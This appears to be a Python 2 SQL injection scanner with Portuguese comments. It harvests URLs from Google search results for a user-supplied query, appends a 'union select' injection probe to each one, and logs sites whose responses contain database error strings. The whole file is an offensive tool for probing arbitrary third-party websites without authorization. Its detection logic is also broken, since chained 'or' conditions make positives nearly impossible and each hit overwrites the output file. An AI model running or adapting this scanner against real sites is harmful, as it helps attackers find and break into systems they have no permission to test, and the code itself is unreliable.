#!/usr/bin/python
# -*- coding: cp1252 -*-
#title			:sql_injection_scanner.py
#description	        :Find url vull sql injetion
#author			:Notronsite
#date			:20140524
#version		:1.1
#usage			:python sql_injection_scanner.py
#notes			:
#python_version	:2.6.6
#==============================================================================
import urllib
import urllib2
from urllib2 import URLError
from urllib2 import HTTPError
import json as m_json
query = raw_input ( 'Query: ' )
query = urllib.urlencode ( { 'q' : query } )
count = 1
while (count < 200):
    response = urllib.urlopen ( 'http://ajax.googleapis.com/ajax/services/search/web?v=1.0&' + query + '&start=' + str(count)).read() 
    json = m_json.loads ( response )
    try :
        results = json [ 'responseData' ] [ 'results' ]
    except :
        pass
    count = count + 10
    for result in results:
        url = result['url']
        print (url)
        
        try:
            request = urllib2.Request(url + "+and+0=1+union+select+")    

            # Abre a conexão
            fd = urllib2.urlopen(request)

            # Efetua a leitura do conteúdo.
            content = fd.read()
            fd.close()
            if (content.find("error in your SQL syntax") == -1) or (content.find("ODBC SQL Server Driver") == -1) or (content.find("SQL syntax error") == -1) or (content.find("mysql_num_rows") == -1) or (content.find("ASP.NET_SessionId") == -1) or (content.find("Fatal error") == -1) or (content.find("Incorrect syntax near") == -1) or (content.find("Internal Server Error") == -1) or (content.find("PostgreSQL query failed") == -1) or (content.find("Syntax error in query expression") == -1) or (content.find("Division by zero in") == -1) or (content.find("invalid query") == -1) or (content.find("MYSQL error") == -1) or (content.find("mysql_fetch_array") == -1):
                print ("Falha nao encontrada")
            else:
                print ("Falha encontrada")
                arq = open("retorno.txt", "w")
                arq.write(url)
                #para inserir quebra de linha
                arq.write("\n")
        except HTTPError, e:
            print ("Falha nao encontrada")
            #print("Cod.: ", e.code)        
        except URLError, e:
            print ("Falha nao encontrada")
            #print("Mensagem: ", e.reason)        
           
